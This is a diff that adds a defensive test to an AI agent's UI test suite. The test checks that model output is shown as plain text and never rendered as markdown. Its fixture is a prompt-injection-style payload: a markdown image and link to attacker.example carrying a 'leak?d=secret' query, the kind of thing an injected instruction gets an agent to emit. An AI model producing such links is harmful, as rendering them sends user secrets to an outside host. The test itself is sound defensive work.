@@ -72,6 +72,22 @@ def test_trace_view_shows_recorded_events(data_dir):  # 20
     assert "Waiting for human approval" in md
 
 
+def test_model_output_is_never_rendered_as_markdown(data_dir):
+    """Injected text steering the model must not become a live link/image in the UI."""
+    from agent.mock_providers import ScriptedProvider, text
+    sv = build_services(data_dir)
+    payload = "Done ![x](https://attacker.example/leak?d=secret) [click](https://attacker.example)"
+    agent = build_agent(sv, ScriptedProvider([[text(payload)]]))
+    state = agent.run(agent.start("x").run_id)
+    for view, args in [("execution", ()), ("workspace", ("mock-heuristic", False))]:
+        at = _view(view, *args)
+        at.session_state["active_run_id"] = state.run_id
+        at.run()
+        assert not at.exception
+        assert "](https://attacker.example" not in _all_markdown(at)  # not in any markdown element
+        assert any(payload in t.value for t in at.text)  # shown verbatim as plain text instead
+
+
 def test_portfolio_reflects_real_writes(data_dir):  # 21
     at = _view("portfolio").run()
     assert any("Nothing is published yet" in i.value for i in at.info)
